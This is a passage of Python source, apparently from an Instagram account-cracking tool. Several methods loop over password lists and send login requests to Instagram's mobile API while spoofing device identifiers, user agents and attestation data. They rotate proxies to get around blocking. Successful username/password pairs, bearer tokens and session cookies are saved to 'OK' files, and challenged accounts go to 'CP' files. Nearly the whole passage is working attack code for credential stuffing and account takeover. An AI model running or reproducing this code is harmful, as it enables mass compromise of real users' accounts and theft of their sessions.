                  'x-ig-nav-chain': f'SelfFragment:self_profile:2:main_profile:{str(time.time())[:14]}::,ProfileMenuFragment:bottom_sheet_profile:3:button:{str(time.time())[:14]}::,ProfileMenuFragment:bottom_sheet_profile:4:button:{str(time.time())[:14]}::,UserOptionsFragment:settings_category_options:5:button:{str(time.time())[:14]}::,AddAccountBottomSheetFragment:add_account_bottom_sheet:6:button:{str(time.time())[:14]}::,LoginLandingFragment:login_landing:7:button:{str(time.time())[:14]}::',
                  'x-fb-connection-type': 'MOBILE.LTE',
                  'x-ig-connection-type': 'MOBILE(LTE)',
                  'x-ig-capabilities': '3brTv10=',
                  'x-ig-app-id': '567067343352427',
                  'priority': 'u=3',
                  'user-agent': f'{self.NewUserAgentApps()}',
                  'accept-language': 'en-US',
                  'x-mid': f'{igmid}' if x.headers.get('ig-set-x-mid') is None else x.headers.get('ig-set-x-mid'),
                  'ig-intended-user-id': '0',
                  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'content-length': '1018',
                  'x-fb-http-engine': 'Liger',
                  'x-fb-client-ip': 'True',
                  'x-fb-server-cluster': 'True',
               }
               self.e = self.EncryptionPassword(public_key, key_id, password)
               self.p = self.ig_signature(json.dumps({
                   "jazoest":"22634","country_codes":"[{\"country_code\":\"1\",\"source\":[\"default\"]}]","phone_id":f"{fayid}","enc_password":f"{self.e}","username":f"{user}","adid":f"{str(uuid.uuid4())}","guid":f"{devid}","device_id":f"android-{adoid}","google_tokens":"[]","login_attempt_count":"1"
                  }
               ))
               self.s = random.choice(self.PROXY['proxi'])
               self.i = {'http': self.s}
               self.r = ssion.post(f'https://{self.api}/api/v1/accounts/login/', data=self.p, headers=self.h, proxies=self.i)
               if 'logged_in_user' in str(self.r.text):
                   try:
                       self.bear = self.r.headers.get('ig-set-authorization').split(':')[2]
                       self.coki = 'mid=%s;'% igmid + self.CookieBearer(self.bear)
                   except:
                       self.coki = False

                   if(self.coki):
                      try:
                          self.info = self.friends_user(self.coki)
                          self.facebook = self.Fafo(self.coki)
                      except:
                          self.info = ('','')
                          self.facebook = ('','')
                   else:
                      self.info = ('','')
                      self.facebook = ('','')

                   if ('pw_kham') in str(self.info):
                      self.info = self.friends_user_chek(user)

                   tree = Tree('\r[white]╭ [green]logged in user                                          ',style='green')
                   tree.add(f'{user}|{password}')
                   tree.add(f'{self.info[0]} {self.info[1]}')
                   tree.add(f'{self.facebook[0]} {self.facebook[1]}')
                   tree.add(f'{self.coki}')
                   Print(tree)
                   print('\r                                    ')
                   self.save = '%s|%s|%s|%s|%s\n'%(user,password,self.info[0], self.info[1], self.coki)
                   open(self.ok,'a').write(self.save)
                   self.ResultSuccess +=1
                   break

               elif 'https://i.instagram.com/challenge/' in str(self.r.text) or 'instagram.com/challenge/' in str(self.r.text):
                   self.kontol = self.friends_user_chek(user)
                   tree = Tree('\r[white]╭ [yellow]challenge                                          ',style='yellow')
                   tree.add(f'{user}|{password}')
                   tree.add(f'{self.kontol[0]}|{self.kontol[1]}')
                   Print(tree)
                   print('\r                                    ')
                   self.save = '%s|%s|%s|%s\n'%(user, password, self.kontol[0], self.kontol[1])
                   open(self.cp,'a').write(self.save)
                   self.ResultChechpoint +=1
                   break
           except (requests.exceptions.ConnectionError):
              time.sleep(30)
              self.ApiTypeAddAcc(user,[password])
       self.Loop +=1

   def SmartLockGoogle(self, users, password_list):
       self.rn = requests.Session()
       self.m  = self.x_mid()
       self.ok = 'data/OK-%s-%s-%s.txt'%(datetim.day,datetim.month,datetim.year)
       self.cp = 'data/CP-%s-%s-%s.txt'%(datetim.day,datetim.month,datetim.year)
       print('%s%s/%s success: %s checkpoint: %s				'%(P,self.Loop, len(self.id), self.ResultSuccess, self.ResultChechpoint),end='\r'),sys.stdout.flush()
       self.instagram_bloks_id = 'dcc6b303a01f9d997e9b920abacda0e53add522d0f73c17a3bc0d72570b8e603'
       self.mobileconfig = {
            'bool_opt_policy':'0',
            'mobileconfigsessionless':'',
            'api_version':'3',
            'unit_type':'1',
            'query_hash':'0d8594f797327df4e1cd1ddb97aabcce8441c88889635079ede8afb7ca4ce679',
            'ts': str(datetime.datetime.now().timestamp())[:10],
            'device_id': 'd3682c7a-5663-4aef-9d94-11021dc51ecf',
            'fetch_type':'ASYNC_FULL',
            'family_device_id': '6e875eb4-121f-4e07-988f-01f680c9d00c'
       }
       self.headersmobile = {
            'host': 'i.instagram.com',
            'user-agent': 'Instagram 319.0.0.43.110 Android (31/12; 440dpi; 1080x2254; Xiaomi/Redmi; Redmi Note 9 Pro; joyeuse; qcom; in_ID; 568713873)',
            'x-ig-device-id': 'd3682c7a-5663-4aef-9d94-11021dc51ecf',
            'x-ig-device-locale': 'in_ID',
            'x-ig-android-id': 'android-00853ea0cf1aac4c',
            'x-ig-family-device-id': '6e875eb4-121f-4e07-988f-01f680c9d00c',
            'x-ig-app-id': '567067343352427',
            'x-ig-app-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-fb-connection-type': 'MOBILE(LTE)',
            'x-fb-http-engine': 'Liger',
            'x-ig-capabilities': '3brTvw10=',
            'x-ig-www-claim': '0'
       }
       try:
           x = self.rn.post('https://i.instagram.com/api/v1/launcher/mobileconfig/', data=self.mobileconfig, headers=self.headersmobile)
           key_id = x.headers.get('ig-set-password-encryption-key-id')
           public_key = x.headers.get('ig-set-password-encryption-pub-key')
       except (requests.exceptions.ConnectionError): time.sleep(30)
       if not public_key: key_id, public_key = None, None
       for password in password_list:
           try:
               self.api = random.choice([
                  'i.instagram.com',
                  'b.i.instagram.com'
               ])
               self.e = self.EncryptionPassword(public_key, key_id, password)
               self.h = {
                  'host': str(self.api),
                  'x-ig-app-locale': 'en_US',
                  'x-ig-device-locale': 'in_ID',
                  'x-ig-mapped-locale': 'en_US',
                  'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                  'x-pigeon-rawclienttime': f'{str(time.time())[:14]}',
                  'x-ig-bandwidth-speed-kbps': f'{random.randint(50, 250)}.000',
                  'x-ig-bandwidth-totalbytes-b': '0',
                  'x-ig-bandwidth-totaltime-ms': '0',
                  'x-bloks-version-id': self.instagram_bloks_id,
                  'x-ig-www-claim': '0',
                  'x-bloks-is-prism-enabled': 'false',
                  'x-bloks-is-layout-rtl': 'false',
                  'x-ig-device-id': f'{self.IgUniq()}',
                  'x-ig-family-device-id': f'{self.IgUniq()}',
                  'x-ig-android-id': 'android-' + self.Android_ID(users,password)[:16],
                  'x-ig-timezone-offset': f'{self.timezone_offset()}',
                  'x-fb-connection-type': 'MOBILE.LTE',
                  'x-ig-connection-type': 'MOBILE(LTE)',
                  'x-ig-capabilities': '3brTv10=',
                  'x-ig-app-id': '567067343352427',
                  'priority': 'u=3',
                  'user-agent': self.NewUserAgentApps(),
                  'accept-language': 'en-US',
                  'x-mid': self.m if x.headers.get('ig-set-x-mid') is None else x.headers.get('ig-set-x-mid'),
                  'ig-intended-user-id': '0',
                  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'content-length': '1810',
                  'accept-encoding': 'gzip, deflate',
                  'x-fb-http-engine': 'Liger',
                  'x-fb-client-ip': 'True',
                  'x-fb-server-cluster': 'True'
               }
               self.d = self.x_signature(json.dumps({"client_input_params":{"device_id":str(self.h['x-ig-android-id']),"lois_settings":{"lois_token":"","lara_override":""},"name":str(users),"machine_id":str(self.h['x-mid']),"profile_pic_url":null,"contact_point":str(users),"encrypted_password":str(self.e)},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"device_id":str(self.h['x-ig-android-id']),"waterfall_id":str(uuid.uuid4()),"INTERNAL__latency_qpl_instance_id":2.16971175100517E14,"login_source":"Login","is_platform_login":0,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":str(self.h['x-ig-family-device-id']),"offline_experiment_group":"caa_iteration_v3_perf_ig_4","INTERNAL_INFRA_THEME":"harm_f","access_flow_version":"F2_FLOW","is_from_logged_in_switcher":0,"qe_device_id":str(uuid.uuid4())}}))
               self.i = {'http': random.choice(self.PROXY['proxi'])}
               self.p = self.rn.post(f'https://{self.api}/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',data=self.d, headers=self.h,proxies=self.i)
               if 'logged_in_user' in str(self.p.text.replace('\\','')):
                   try:
                       self.bearer = re.search('"Bearer IGT:2:(.*?)"', self.p.text.replace('\\','')).group(1)
                       self.cokies = 'mid=%s;'% self.m + self.CookieBearer(self.bearer)
                       self.kontol = self.friends_user(self.cokies)
                       if 'pw_kham' in str(self.kontol):self.kontol = self.friends_user_chek(users)
                       self.facebook = self.Fafo(self.cokies)
                   except:
                       self.kontol   = ('','')
                       self.facebook = ('','')
                       self.cokies   = ('','')
                   tree = Tree('\r[white]╭ [green]logged in user                                          ',style='green')
                   tree.add(f'{users}|{password}')
                   tree.add(f'{self.kontol[0]}|{self.kontol[1]}')
                   tree.add(f'{self.facebook[0]}|{self.facebook[1]}')
                   tree.add(f'{self.cokies}')
                   Print(tree)
                   print('\r                                    ')
                   self.save = '%s|%s|%s|%s|%s\n'%(users, password, self.kontol[0], self.kontol[1], self.cokies)
                   open(self.ok,'a').write(self.save)
                   self.ResultSuccess +=1
                   break

               elif 'https://i.instagram.com/challenge/' in str(self.p.text.replace('\\','')) or 'instagram.com/challenge/' in str(self.p.text.replace('\\','')):
                   self.kontol = self.friends_user_chek(users)
                   tree = Tree('\r[white]╭ [yellow]challenge                                          ',style='yellow')
                   tree.add(f'{users}|{password}')
                   tree.add(f'{self.kontol[0]}|{self.kontol[1]}')
                   Print(tree)
                   print('\r                                    ')
                   self.save = '%s|%s|%s|%s\n'%(users, password, self.kontol[0], self.kontol[1])
                   open(self.cp,'a').write(self.save)
                   self.ResultChechpoint +=1
                   break
               elif "The username you entered doesn't appear to belong to an account. Please check your username and try again." in str(self.p.text.replace('\\','')) or 'Please wait a few minutes' in str(self.p.text.replace('\\','')):
                   print('alamat ip kamu di block, mode pesawat                ', end='\r');time.sleep(5)
           except (requests.exceptions.ConnectionError):
               time.sleep(30)
               self.SmartLockGoogle(users, [password])

       self.Loop +=1

   def x_instagram_login_manual(self, users, passwordlist):
       self.rn = requests.Session()
       self.m  = self.x_mid()
       self.ok = 'data/OK-%s-%s-%s.txt'%(datetim.day,datetim.month,datetim.year)
       self.cp = 'data/CP-%s-%s-%s.txt'%(datetim.day,datetim.month,datetim.year)
       print('%s%s/%s success: %s checkpoint: %s                '%(P,self.Loop, len(self.id), self.ResultSuccess, self.ResultChechpoint),end='\r'),sys.stdout.flush()
       self.instagram_bloks_id = 'dcc6b303a01f9d997e9b920abacda0e53add522d0f73c17a3bc0d72570b8e603'
       self.mobileconfig = {
            'bool_opt_policy':'0',
            'mobileconfigsessionless':'',
            'api_version':'3',
            'unit_type':'1',
            'query_hash':'0d8594f797327df4e1cd1ddb97aabcce8441c88889635079ede8afb7ca4ce679',
            'ts': str(datetime.datetime.now().timestamp())[:10],
            'device_id': 'd3682c7a-5663-4aef-9d94-11021dc51ecf',
            'fetch_type':'ASYNC_FULL',
            'family_device_id': '6e875eb4-121f-4e07-988f-01f680c9d00c'
       }
       self.headersmobile = {
            'host': 'i.instagram.com',
            'user-agent': 'Instagram 319.0.0.43.110 Android (31/12; 440dpi; 1080x2254; Xiaomi/Redmi; Redmi Note 9 Pro; joyeuse; qcom; in_ID; 568713873)',
            'x-ig-device-id': 'd3682c7a-5663-4aef-9d94-11021dc51ecf',
            'x-ig-device-locale': 'in_ID',
            'x-ig-android-id': 'android-00853ea0cf1aac4c',
            'x-ig-family-device-id': '6e875eb4-121f-4e07-988f-01f680c9d00c',
            'x-ig-app-id': '567067343352427',
            'x-ig-app-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-fb-connection-type': 'MOBILE(LTE)',
            'x-fb-http-engine': 'Liger',
            'x-ig-capabilities': '3brTvw10=',
            'x-ig-www-claim': '0'
       }
       try:
           x = self.rn.post('https://i.instagram.com/api/v1/launcher/mobileconfig/', data=self.mobileconfig, headers=self.headersmobile)
           key_id = x.headers.get('ig-set-password-encryption-key-id')
           public_key = x.headers.get('ig-set-password-encryption-pub-key')
       except (requests.exceptions.ConnectionError): time.sleep(30)
       if not public_key: key_id, public_key = None, None
       for password in passwordlist:
           try:
               self.api = random.choice([
                  'i.instagram.com',
                  'b.i.instagram.com'
               ])
               self.e = self.EncryptionPassword(public_key, key_id, password)
               self.h = {
                  'host': str(self.api),
                  'x-ig-app-locale': 'en_US',
                  'x-ig-device-locale': 'in_ID',
                  'x-ig-mapped-locale': 'en_US',
                  'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                  'x-pigeon-rawclienttime': f'{str(time.time())[:14]}',
                  'x-ig-bandwidth-speed-kbps': f'{random.randint(50, 250)}.000',
                  'x-ig-bandwidth-totalbytes-b': '0',
                  'x-ig-bandwidth-totaltime-ms': '0',
                  'x-bloks-version-id': self.instagram_bloks_id,
                  'x-ig-www-claim': '0',
                  'x-bloks-is-prism-enabled': 'false',
                  'x-bloks-is-layout-rtl': 'false',
                  'x-ig-device-id': f'{self.IgUniq()}',
                  'x-ig-family-device-id': f'{self.IgUniq()}',
                  'x-ig-android-id': 'android-' + self.Android_ID(users,password)[:16],
                  'x-ig-timezone-offset': f'{self.timezone_offset()}',
                  'x-fb-connection-type': 'MOBILE.LTE',
                  'x-ig-connection-type': 'MOBILE(LTE)',
                  'x-ig-capabilities': '3brTv10=',
                  'x-ig-app-id': '567067343352427',
                  'priority': 'u=3',
                  'user-agent': self.NewUserAgentApps(),
                  'accept-language': 'en-US',
                  'x-mid': self.m if x.headers.get('ig-set-x-mid') is None else x.headers.get('ig-set-x-mid'),
                  'ig-intended-user-id': '0',
                  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'content-length': '1810',
                  'accept-encoding': 'gzip, deflate',
                  'x-fb-http-engine': 'Liger',
                  'x-fb-client-ip': 'True',
                  'x-fb-server-cluster': 'True'
               }
               self.i = {'http': random.choice(self.PROXY['proxi'])}
               self.d = self.x_signature(json.dumps({"client_input_params":{"device_id":str(self.h['x-ig-android-id']),"login_attempt_count":1,"secure_family_device_id":"","machine_id":str(self.h['x-mid']),"accounts_list":[],"auth_secure_device_id":"","has_whatsapp_installed":1,"password":str(self.e),"sso_token_map_json_string":"","family_device_id":str(self.h['x-ig-family-device-id']),"fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":"","lara_override":""},"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"client_known_key_hash":"","contact_point":str(users),"encrypted_msisdn":""},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"login","waterfall_id":str(uuid.uuid4()),"login_source":"Login","is_platform_login":0,"INTERNAL__latency_qpl_marker_id":36707139,"offline_experiment_group":null,"is_from_landing_page":0,"password_text_input_id":"of3xfo:64","is_from_empty_password":0,"ar_event_source":"login_home_page","username_text_input_id":"of3xfo:63","layered_homepage_experiment_group":null,"should_show_nested_nta_from_aymh":1,"device_id":str(self.h['x-ig-android-id']),"INTERNAL__latency_qpl_instance_id":1.47656576400177E14,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":str(self.h['x-ig-family-device-id']),"INTERNAL_INFRA_THEME":"harm_f","access_flow_version":"LEGACY_FLOW","is_from_logged_in_switcher":0}}))
               self.rs = self.rn.post(f'https://{self.api}/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.d, headers=self.h, proxies=self.i)
               if 'logged_in_user' in str(self.rs.text.replace('\\','')):
                   self.bearer = re.search('"Bearer IGT:2:(.*?)"', self.rs.text.replace('\\','')).group(1)
                   self.cokies = 'mid=%s;'% self.m + self.CookieBearer(self.bearer)
                   self.kontol = self.friends_user(self.cokies)
                   if 'pw_kham' in str(self.kontol):self.kontol = self.friends_user_chek(users)
                   self.facebook = self.Fafo(self.cokies)
                   tree = Tree('\r[white]╭ [green]logged in user                                          ',style='green')
                   tree.add(f'{users}|{password}')
                   tree.add(f'{self.kontol[0]}|{self.kontol[1]}')
                   tree.add(f'{self.facebook[0]}|{self.facebook[1]}')
                   tree.add(f'{self.cokies}')
                   Print(tree)
                   print('\r                                    ')
                   self.save = '%s|%s|%s|%s|%s\n'%(users, password, self.kontol[0], self.kontol[1], self.cokies)
                   open(self.ok,'a').write(self.save)
                   self.ResultSuccess +=1
                   break
               elif 'https://i.instagram.com/challenge/' in str(self.rs.text.replace('\\','')) or 'instagram.com/challenge/' in str(self.rs.text.replace('\\','')):
                   self.kontol = self.friends_user_chek(users)
                   tree = Tree('\r[white]╭ [yellow]challenge                                          ',style='yellow')
                   tree.add(f'{users}|{password}')
                   tree.add(f'{self.kontol[0]}|{self.kontol[1]}')
                   Print(tree)
                   print('\r                                    ')
                   self.save = '%s|%s|%s|%s\n'%(users, password, self.kontol[0], self.kontol[1])
                   open(self.cp,'a').write(self.save)
                   self.ResultChechpoint +=1
                   break
           except (requests.exceptions.ConnectionError):
               time.sleep(30)
               self.x_instagram_login_manual(users, [password])

       self.Loop +=1

   def x_android(self):
       self.uid4 = str(uuid.uuid4())
       return str(self.uid4)

   def x_recovery_app(self, users, passwordlist):
       self.md = self.x_mid()
       self.qw = requests.Session()
       self.ok = 'data/OK-%s-%s-%s.txt'%(datetim.day,datetim.month,datetim.year)
       self.cp = 'data/CP-%s-%s-%s.txt'%(datetim.day,datetim.month,datetim.year)
       self.pige = str(uuid.uuid4())
       self.dvid = self.x_android()
       self.famy = str(uuid.uuid4())
       self.andr = self.dvid.replace('-','')[:16]
       signature_bloks = 'dcc6b303a01f9d997e9b920abacda0e53add522d0f73c17a3bc0d72570b8e603'
       print('%s%s/%s success: %s checkpoint: %s                '%(P,self.Loop, len(self.id), self.ResultSuccess, self.ResultChechpoint),end='\r')
       self.mobileconfig = {
            'bool_opt_policy':'0',
            'mobileconfigsessionless':'',
            'api_version':'3',
            'unit_type':'1',
            'query_hash':'0d8594f797327df4e1cd1ddb97aabcce8441c88889635079ede8afb7ca4ce679',
            'ts': str(datetime.datetime.now().timestamp())[:10],
            'device_id': 'd3682c7a-5663-4aef-9d94-11021dc51ecf',
            'fetch_type':'ASYNC_FULL',
            'family_device_id': '6e875eb4-121f-4e07-988f-01f680c9d00c'
       }
       self.headersmobile = {
            'host': 'i.instagram.com',
            'user-agent': 'Instagram 319.0.0.43.110 Android (31/12; 440dpi; 1080x2254; Xiaomi/Redmi; Redmi Note 9 Pro; joyeuse; qcom; in_ID; 568713873)',
            'x-ig-device-id': 'd3682c7a-5663-4aef-9d94-11021dc51ecf',
            'x-ig-device-locale': 'in_ID',
            'x-ig-android-id': 'android-00853ea0cf1aac4c',
            'x-ig-family-device-id': '6e875eb4-121f-4e07-988f-01f680c9d00c',
            'x-ig-app-id': '567067343352427',
            'x-ig-app-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-fb-connection-type': 'MOBILE(LTE)',
            'x-fb-http-engine': 'Liger',
            'x-ig-capabilities': '3brTvw10=',
            'x-ig-www-claim': '0'
       }
       try:
           x = self.qw.post('https://i.instagram.com/api/v1/launcher/mobileconfig/', data=self.mobileconfig, headers=self.headersmobile)
           key_id = x.headers.get('ig-set-password-encryption-key-id')
           public_key = x.headers.get('ig-set-password-encryption-pub-key')
       except (requests.exceptions.ConnectionError): time.sleep(30)
       if not public_key: key_id, public_key = None, None
       for password in passwordlist:
           try:
               self.api = random.choice([
                  'i.instagram.com',
                  'b.i.instagram.com'
               ])
               self.headers = {
                  'Host': str(self.api),
                  'x-ig-app-locale': 'en_US',
                  'x-ig-device-locale': 'in_ID',
                  'x-ig-mapped-locale': 'en_US',
                  'x-pigeon-session-id': f'UFS-{self.pige}-0',
                  'x-pigeon-rawclienttime': f'{time.time():.3f}',
                  'x-ig-bandwidth-speed-kbps': '-1.000',
                  'x-ig-bandwidth-totalbytes-b': '0',
                  'x-ig-bandwidth-totaltime-ms': '0',
                  'x-bloks-version-id': signature_bloks,
                  'x-ig-www-claim': '0',
                  'x-bloks-is-prism-enabled': 'false',
                  'x-bloks-is-layout-rtl': 'false',
                  'x-ig-device-id': f'{self.dvid}',
                  'x-ig-family-device-id': f'{self.famy}',
                  'x-ig-android-id': f'android-{self.andr}',
                  'x-ig-timezone-offset': f'{self.timezone_offset()}',
                  'x-fb-connection-type': 'MOBILE.LTE',
                  'x-ig-connection-type': 'MOBILE(LTE)',
                  'x-ig-capabilities': '3brTv10=',
                  'x-ig-app-id': '567067343352427',
                  'priority': 'u=3',
                  'user-agent': f'{self.NewUserAgentApps()}',
                  'accept-language': 'en-US',
                  'x-mid': f'{self.md}' if x.headers.get('ig-set-x-mid') is None else x.headers.get('ig-set-x-mid'),
                  'ig-intended-user-id': '0',
                  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'x-fb-http-engine': 'Liger',
                  'x-fb-client-ip': 'True',
                  'x-fb-server-cluster': 'True',
                  'Connection': 'keep-alive',
                  'x-ig-attest-params': r'{"attestation":[{"version":1,"type":"keystore","challenge_nonce":"H9wkDxpdC4JlmQL7VFI3GqPBNTeYKUub","signed_nonce":"MEUCIEJA4-tlTbhliRS5o1Ny4lfo0wW3sQUIs5rg6hDIJTV-AiEAi2WNkgculf63aLQWge0WqKq_s5x3xCV0BhiCaSkUjfI=","key_hash":"e24413f9e7e07b1734450e1c4e67af4f48ee35d3d77d9d540b766d6d1c2c9cef","certificate_chain":"-----BEGIN CERTIFICATE-----\nMIICqDCCAk6gAwIBAgIBATAKBggqhkjOPQQDAjA5MQwwCgYDVQQMDANURUUxKTAnBgNVBAUTIGFj\nZmVjNTI1ZDAzZmI4NGMwMGI5ZDg5NGU3ZDBlM2MzMB4XDTcwMDEwMTAwMDAwMFoXDTQ5MTIzMTIz\nNTk1OVowHzEdMBsGA1UEAwwUQW5kcm9pZCBLZXlzdG9yZSBLZXkwWTATBgcqhkjOPQIBBggqhkjO\nPQMBBwNCAASTLoWfrZUpjLTKuKye49Owjj6CT1oq9DtNjMbvpzR0QeMiHTJfzWRxRPfjheGkAbok\n28nqZftzI0lCe0N2iXz3o4IBXzCCAVswDwYDVR0PAQH\/BAUDAweAADCCAUYGCisGAQQB1nkCAREE\nggE2MIIBMgIBBAoBAQIBKQoBAQQgUTg3c2RyaUtUWkFSMVhDRTNoSHhtNXUyYWtXZmU2VXEEADBZ\nv4U9CAIGAZFUAU7Tv4VFSQRHMEUxHzAdBBVjb20uaW5zdGFncmFtLmFuZHJvaWQCBBYbqtkxIgQg\n3nOjHP33LvW+wVHkOksxz11WTiP3nrw9lLWAFEkbVqEwgaShCDEGAgEDAgECogMCAQOjBAICAQCl\nBTEDAgEEqgMCAQG\/g3cCBQC\/hT4DAgEAv4VATDBKBCBP\/IgfqvstGvfdQM+6TKkEZLT1aJ739Ow6\nD+e3QUQGiAEB\/woBAAQgJuQCmvyR90txCe3iNIGKvKdWmpFOTbQ65mpVhG1Zqxq\/hUEFAgMB1MC\/\nhUIFAgMDFke\/hU4GAgQBNLPBv4VPBgIEATQVjjAKBggqhkjOPQQDAgNIADBFAiA0uybZeAaDdBX1\nBUa7RP2CiPd4u76C8NLJkrQlcuXKXgIhALp23Ce4ZNHygVSglZkWqfRNXzqiTAMh2KeU1BMoJXE4\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIIB8zCCAXqgAwIBAgIRAKw5N3apIOUYirAYFzhlM3kwCgYIKoZIzj0EAwIwOTEMMAoGA1UEDAwD\nVEVFMSkwJwYDVQQFEyBiOTZhYjExM2JhMWYzZTQxOGE2ZTI5NTk2OWI2NTU4ODAeFw0yMjAzMjAx\nOTExMjZaFw0zMjAzMTcxOTExMjZaMDkxDDAKBgNVBAwMA1RFRTEpMCcGA1UEBRMgYWNmZWM1MjVk\nMDNmYjg0YzAwYjlkODk0ZTdkMGUzYzMwWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAQ8LycYgh6i\nxf+chuMgQ+qtwSorldBDA56mUhYzFxx8\/D280T8hbTTHRWzX7KZVBE0Z8i2DrP3dlfXSz2C29xsu\no2MwYTAdBgNVHQ4EFgQUbVdrmxr7lqQZE+d\/jHauzmS8qFIwHwYDVR0jBBgwFoAUIe5UP4CGyBa4\naao3uGaJfdVw1EEwDwYDVR0TAQH\/BAUwAwEB\/zAOBgNVHQ8BAf8EBAMCAgQwCgYIKoZIzj0EAwID\nZwAwZAIwW0TofY8bRkrgUBFyRV2HeF2WK6tT\/JaxUyYu8XDBHdaaulUMoMtl\/DUGdQTDN0CzAjA5\nBMI34GZ4RHMbQ1ycChqeDBTRb6raAYQ+m9nZnadt2i2VY1MLgk1dWwcFLckY0n0=\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIIDlDCCAXygAwIBAgIRANwMj8dk\/73pfkJPbcp6NN4wDQYJKoZIhvcNAQELBQAwGzEZMBcGA1UE\nBRMQZjkyMDA5ZTg1M2I2YjA0NTAeFw0yMjAzMjAxOTA4MjlaFw0zMjAzMTcxOTA4MjlaMDkxDDAK\nBgNVBAwMA1RFRTEpMCcGA1UEBRMgYjk2YWIxMTNiYTFmM2U0MThhNmUyOTU5NjliNjU1ODgwdjAQ\nBgcqhkjOPQIBBgUrgQQAIgNiAAQn9gO\/2GfpngnTYRpyDto7CwqBCxLGCueNxB4LMTEhgru3RBVR\n8K+OSC6E1zYv7vmTeH51epxVqdMxBklwTZ83y5DKVwkM9xC5RIPROnfWlVInFFZz1cPsb9aKs9Ib\nXvOjYzBhMB0GA1UdDgQWBBQh7lQ\/gIbIFrhpqje4Zol91XDUQTAfBgNVHSMEGDAWgBQ2YeEAfIgF\nCVGLRGxH\/xpMyepPEjAPBgNVHRMBAf8EBTADAQH\/MA4GA1UdDwEB\/wQEAwICBDANBgkqhkiG9w0B\nAQsFAAOCAgEACd3WEMbx29zTCgTDrQq5ruqxztJZEkzigndANZVlS7B\/TC\/+npgdYIf9SR0p6ZUc\n4KHv0RkP0\/KSKLijvXfvjYQB463ZpHft6M7x4yJta0Vx3GXGFeR+rMB\/4KA5NbtZ60M2BiFn5SeG\nBw\/B6Eb1In8MXfUI8jbBlhh6ud5ThJYHMM3tD\/Mu37Yfb\/LkGfBDZfsziYq6DLcjxNYYm9qPEW7z\nbbS1GlUqi+5wap+VvYLTJn8Dki1FR7fCQpJ6njhEg64bBwGOHqL4taoxWn3E27LSVSwhGZ+0ky2+\nAzevhOGykH956iLQCvUuhAz9ZN7MhLoA8x6qmJ5ALfn9BXER\/Mq0dER6PnGHjyK0hgNH5hj3sbL9\nbkzb\/BWufFjQRItUQBoHTivoOxSkGLmr5XnSe0q0zonjILzVU44dQLMihtEe5ARABPofv7kpYqQi\noreLy4QYSRi3Kiv3zYc9JcepL4I+fo7S+yCgbd23X6eRSUITUF3CLRDvPcPmAMyCB13lk2elq+gt\nVFt3SdejClgMFD6p4D5yDcpK0MXwMJ74Bq3DdjLtsv1u7ps3Y3RvdMZjqwkUCbcpsavGX+uz79A3\nanxetyoCd5DTMe+nCUIYD7sYVqUEhnwaOBXwLex+O1AXf6\/tlQe1GZk732qUzZT3Mk9YIwIfD0gI\niI3TD4ted2Q=\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIIFHDCCAwSgAwIBAgIJAPHBcqaZ6vUdMA0GCSqGSIb3DQEBCwUAMBsxGTAXBgNVBAUTEGY5MjAw\nOWU4NTNiNmIwNDUwHhcNMjIwMzIwMTgwNzQ4WhcNNDIwMzE1MTgwNzQ4WjAbMRkwFwYDVQQFExBm\nOTIwMDllODUzYjZiMDQ1MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAr7bHgiuxpwHs\nK7Qui8xUFmOr75gvMsd\/dTEDDJdSSxtf6An7xyqpRR90PL2abxM1dEqlXnf2tqw1Ne4Xwl5jlRfd\nnJLmN0pTy\/4lj4\/7tv0Sk3iiKkypnEUtR6WfMgH0QZfKHM1+di+y9TFRtv6y\/\/0rb+T+W8a9nsNL\n\/ggjnar86461qO0rOs2cXjp3kOG1FEJ5MVmFmBGtnrKpa73XpXyTqRxB\/M0n1n\/W9nGqC4FSYa04\nT6N5RIZGBN2z2MT5IKGbFlbC8UrW0DxW7AYImQQcHtGl\/m00QLVWutHQoVJYnFPlXTcHYvASLu+R\nhhsbDmxMgJJ0mcDpvsC4PjvB+TxywElgS70vE0XmLD+OJtvsBslHZvPBKCOdT0MS+tgSOIfga+z1\nZ1g7+DVagf7quvmag8jfPioyKvxnK\/EgsTUVi2ghzq8wm27ud\/mIM7AY2qEORR8Go3TVB4HzWQgp\nZrt3i5MIlCaY504LzSRiigHCzAPlHws+W0rB5N+er5\/2pJKnfBSDiCiFAVtCLOZ7gLiMm0jhO2B6\ntUXHI\/+MRPjy02i59lINMRRev56GKtcd9qO\/0kUJWdZTdA2XoS82ixPvZtXQpUpuL12ab+9EaDK8\nZ4RHJYYfCT3Q5vNAXaiWQ+8PTWm2QgBR\/bkwSWc+NpUFgNPN9PvQi8WEg5UmAGMCAwEAAaNjMGEw\nHQYDVR0OBBYEFDZh4QB8iAUJUYtEbEf\/GkzJ6k8SMB8GA1UdIwQYMBaAFDZh4QB8iAUJUYtEbEf\/\nGkzJ6k8SMA8GA1UdEwEB\/wQFMAMBAf8wDgYDVR0PAQH\/BAQDAgIEMA0GCSqGSIb3DQEBCwUAA